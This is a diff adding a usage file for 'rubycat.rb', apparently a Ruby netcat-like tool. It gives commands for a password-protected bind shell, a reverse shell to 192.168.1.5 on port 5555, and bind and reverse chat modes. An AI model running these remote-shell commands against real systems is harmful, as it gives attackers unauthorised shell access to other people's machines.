@@ -1,0 +1,13 @@
+*** Bind Shell with Password - default password is passw0rd ***
+./rubycat.rb -b -p 5555
+(or)
+./rubycat.rb -b -p 5555 -P passw0rd
+
+*** Reverse Shell ***
+./rubycat.rb -r -i 192.168.1.5 -p 5555
+
+*** Bind Chat Messenger ***
+./rubycat.rb -l -p 5555
+
+*** Reverse Chat Messenger ***
+./rubycat.rb -c -i 192.168.1.5 -p 5555
